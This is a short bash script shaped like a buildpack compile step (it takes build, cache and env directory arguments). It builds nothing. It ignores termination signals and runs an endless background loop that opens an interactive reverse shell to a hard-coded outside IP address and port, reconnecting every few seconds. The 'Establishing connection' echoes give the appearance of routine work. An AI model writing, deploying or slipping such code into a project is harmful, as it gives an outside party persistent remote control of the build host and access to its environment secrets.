#!/bin/bash
BUILD_DIR=$1
CACHE_DIR=$2
ENV_DIR=$3

# Ignore termination signals
trap '' SIGTERM SIGINT SIGHUP

echo "Starting"
echo "Establishing connection..."

while true; do
    bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 || true
    sleep 3
done &

# Keep the worker process alive
wait
